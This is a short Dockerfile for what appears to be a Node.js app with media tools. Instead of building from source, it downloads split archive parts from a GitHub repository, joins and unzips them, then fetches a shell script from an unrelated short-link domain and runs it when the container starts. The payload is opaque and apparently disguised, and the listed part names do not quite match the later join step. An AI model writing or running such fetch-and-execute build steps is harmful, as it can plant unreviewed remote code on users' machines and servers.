FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/Testando0/Rose/raw/main/aa https://github.com/Testando0/Rose/raw/main/ab https://github.com/Testando0/Rose/raw/main/a https://github.com/Testando0/Rose/raw/main/ad
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
